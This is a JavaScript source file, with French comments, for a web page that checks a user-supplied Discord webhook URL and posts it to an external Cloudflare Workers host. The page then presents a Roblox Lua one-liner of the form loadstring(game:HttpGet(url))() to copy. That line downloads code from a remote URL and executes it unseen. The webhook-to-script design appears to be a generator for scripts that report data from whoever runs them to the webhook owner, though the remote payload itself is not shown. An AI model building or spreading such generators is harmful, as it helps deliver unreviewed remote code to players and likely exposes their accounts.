// script.js – Version corrigée : affichage direct sur site + format loadstring exact

function isValidDiscordWebhook(url) {
  const prefix = "https://discord.com/api/webhooks/";
  if (!url.startsWith(prefix)) return false;
  const parts = url.slice(prefix.length).split('/');
  if (parts.length !== 2) return false;
  const id = parts[0];
  const token = parts[1];
  if (!/^\d{17,21}$/.test(id)) return false;
  if (!/^[a-zA-Z0-9_-]+$/.test(token)) return false;
  return true;
}

document.getElementById('webhookForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const webhookInput = document.getElementById('webhook');
  const webhook = webhookInput.value.trim();

  if (!webhook) {
    alert("Please enter a webhook!");
    return;
  }

  if (!isValidDiscordWebhook(webhook)) {
    alert("Error: Please enter a valid Discord webhook URL starting with https://discord.com/api/webhooks/");
    return;
  }

  // Désactive bouton pendant traitement
  const submitBtn = this.querySelector('button[type="submit"]');
  submitBtn.disabled = true;
  submitBtn.textContent = "Génération...";

  try {
    const response = await fetch("https://throbbing-dream-62ca.imran-ouarezki-f0c.workers.dev/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ webhook })
    });

    if (!response.ok) {
      const err = await response.json();
      throw new Error(err.error || "Erreur serveur inconnue");
    }

    const data = await response.json();

    if (data.error) {
      throw new Error(data.error);
    }

    // On affiche EXACTEMENT le format demandé
    const finalText = `loadstring(game:HttpGet("${data.rawUrl}"))()`;

    const luaArea = document.getElementById('luaScript');
    luaArea.value = finalText;
    luaArea.style.display = "block";

    document.getElementById('resultTitle').textContent = "Script final prêt à copier !";
    document.getElementById('resultTitle').style.display = "block";

    document.getElementById('copyBtn').style.display = "inline-block";

    // Pas d'alerte, tout s'affiche sur le site
    console.log("[SUCCESS] Script généré :", finalText);

  } catch (err) {
    alert("Erreur : " + err.message + "\nVérifie ta connexion ou réessaie.");
    console.error("Erreur fetch Worker :", err);
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = "Gen Your Script";
  }
});

// Bouton copier (copie le contenu exact)
document.getElementById('copyBtn').addEventListener('click', function() {
  const luaArea = document.getElementById('luaScript');
  luaArea.select();
  luaArea.setSelectionRange(0, 99999);
  
  try {
    navigator.clipboard.writeText(luaArea.value);
    // Petit feedback visuel sans alerte lourde
    this.textContent = "Copié !";
    setTimeout(() => { this.textContent = "Copy Script"; }, 2000);
  } catch (err) {
    alert("Erreur copie : sélectionne et copie manuellement.");
  }
});
